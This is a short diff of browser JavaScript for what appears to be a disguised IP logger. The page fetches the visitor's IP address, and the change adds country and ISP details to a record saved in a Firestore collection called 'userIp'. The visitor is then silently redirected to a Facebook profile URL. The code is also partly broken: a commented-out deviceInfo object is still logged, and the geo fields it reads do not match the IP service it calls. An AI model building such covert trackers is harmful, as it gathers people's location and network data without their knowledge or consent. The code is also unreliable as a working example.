@@ -8,13 +8,13 @@ fetch('https://api.ipify.org/?format=json')
       .then(response => response.json())
       .then(data => {
 
-//         const geoBasicInfo = {
-//             ip_number: data.ip_number,
-//             ip_version: data.ip_version,
-//             country_name: data.country_name,
-//             country_code2: data.country_code2,
-//             isp: data.isp,
-//         }
+        const geoBasicInfo = {
+            ip_number: data.ip_number,
+            ip_version: data.ip_version,
+            country_name: data.country_name,
+            country_code2: data.country_code2,
+            isp: data.isp,
+        }
 
 //         const deviceInfo = {
 //           userAgent: navigator.userAgent,
@@ -29,7 +29,7 @@ fetch('https://api.ipify.org/?format=json')
         console.log(deviceInfo);
 
         db.collection("userIp").add({
-            ipAddress, time: new Date(),
+            ipAddress, time: new Date(), geoBasicInfo,
 //             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
         }).then(_ => {
             window.location.replace("http://www.facebook.com/profile.php?")
